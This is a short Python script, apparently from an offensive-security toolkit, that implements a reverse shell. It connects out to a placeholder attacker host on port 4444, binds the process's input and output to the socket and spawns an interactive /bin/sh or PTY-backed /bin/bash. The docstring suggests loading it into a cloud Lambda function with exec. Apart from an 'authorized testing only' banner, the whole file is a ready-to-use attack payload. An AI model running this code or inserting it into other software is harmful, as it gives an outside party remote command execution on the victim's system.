#!/usr/bin/env python3
"""
Python Reverse Shell Payload
⚠️ AUTHORIZED TESTING ONLY

This payload establishes a reverse shell connection to the attacker.
Modify ATTACKER_IP and ATTACKER_PORT before use.

Usage in Lambda function:
    exec(open('/path/to/reverse-shell.py').read())
"""

import socket
import subprocess
import os
import sys

# Configuration - MODIFY BEFORE USE
ATTACKER_IP = "REPLACE_WITH_ATTACKER_IP"
ATTACKER_PORT = 4444


def reverse_shell():
    """Establish reverse shell connection"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Redirect stdin, stdout, stderr to socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)


def reverse_shell_pty():
    """Reverse shell with PTY for better interaction"""
    import pty
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        pty.spawn("/bin/bash")
    except Exception:
        pass


if __name__ == "__main__":
    reverse_shell()
